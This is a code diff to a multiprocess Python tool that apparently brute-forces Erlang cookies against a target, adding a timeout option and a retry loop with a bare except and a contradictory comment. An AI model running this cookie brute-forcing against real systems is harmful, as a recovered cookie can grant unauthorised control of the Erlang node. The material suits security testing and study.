@@ -38,7 +38,7 @@ def split(a, n):
 
 def go(args):
     # Unpack args
-    (target, interval, version, verbose) = args
+    (target, interval, version, verbose, timeout) = args
 
     # Unpack interval
     (start, end) = (int(i) for i in interval)
@@ -67,9 +67,29 @@ def go(args):
             prog = i
             interval_time_last = time()
             
+        connect_start_time = time()
         cookie = ERLPopper.create_cookie_from_seed(i)
-        if epop.check_cookie(cookie):
-            return cookie
+        # In a loop
+        while 1:
+            # Try checking the cookie
+            try:
+                if epop.check_cookie1(cookie):
+                    return cookie
+            # If an exception occurs
+            except:
+                # And we're past the timeout
+                if time() > connect_start_time + timeout:
+                    # Print an error and return from this function entirely
+                    print(f"[E] Connection to target '{target}' failed after {timeout} seconds. Moving on to next interval.")
+                    return None
+                # If past the timeout, keep trying
+                continue
+            # If we don't have an exception
+            else:
+                # Break out of the while loop and move on to the next seed
+                break
+        
+
     
     with rate.get_lock():
         rate.value -= old_r
@@ -91,6 +111,7 @@ if __name__ == "__main__":
     version_group.add_argument("--new", action="store_true", help="Use new handshake method.")
     parser.add_argument("--verbose", action="store_true", help="Extra output for debugging (n processes all spitting out verbose output... be smart).")
     parser.add_argument("--processes", action="store", type=int, help="Number of processes to use (default: return value of os.cpu_count()).")
+    parser.add_argument("--timeout", action="store", type=int, default=0, help="Time (in seconds) to retry a failing connection before dying gracefully (default: 0)")
 
     args = parser.parse_args()
 
@@ -130,7 +151,7 @@ if __name__ == "__main__":
         found = multiprocessing.Event()
 
         with Pool(processes=num_processes) as pool:
-            targets_intervals_product = product([target], intervals, [version], [args.verbose])
+            targets_intervals_product = product([target], intervals, [version], [args.verbose], [args.timeout])
 
             imap_it = pool.imap(func=go, iterable=targets_intervals_product)
 
